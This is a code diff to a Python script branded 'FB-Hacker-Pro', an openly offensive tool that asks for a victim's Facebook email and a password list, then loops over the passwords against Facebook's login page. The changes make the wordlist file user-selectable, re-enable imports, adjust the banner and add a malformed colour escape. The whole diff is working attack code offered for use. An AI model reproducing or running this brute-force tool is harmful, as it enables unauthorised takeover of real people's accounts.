@@ -1,18 +1,17 @@
+import urllib.request
+import os
 import requests
 import threading
-# import urllib.request
-# import os
+
 from bs4 import BeautifulSoup
 import sys
 try:
 	if sys.version_info[0] < 3:
 		raise "REQUIRED PYTHON 3.x"
 except Exception as ex:
-	print('''		--------------------------------------
-			REQUIRED PYTHON 3.x
+	print('''--------------------------------------
 			use: python3 fb.py
-			Send your problems on https://m.me/B14CKH4K3R
-		--------------------------------------
+		 --------------------------------------
 			''')
 	sys.exit()
 post_url='https://www.facebook.com/login.php'
@@ -54,16 +53,23 @@ def function(email,passw,i):
 	return False
 
 #payload=create_form()
-print('___________________________________________________________________________\n')
-file=open('passwords.lst','r')
+
+G = '/003[32;1m'
+print (G)
+
 i=0
 print(" --------------[FB-Hacker-Pro]---------------\n")
 print(" --------------------------------------------\n\n")
-print("    Author - Hein Arkar(Wtobe_Shining_Star) \n\n")
+print("   Author - Hein Arkar(Wtobe_Shining_Star) \n\n")
 email=input('Enter Email of victim : ')
 print("")
-print      ("Target Email ID       : "+email)
+print            ("Target Email ID       : "+email)
 print("")
+
+passlist = input ("Enter password file   : ")
+print ("")
+file=open(passlist,'r')
+
 while file:
 	passw=file.readline().strip()
 	i+=1
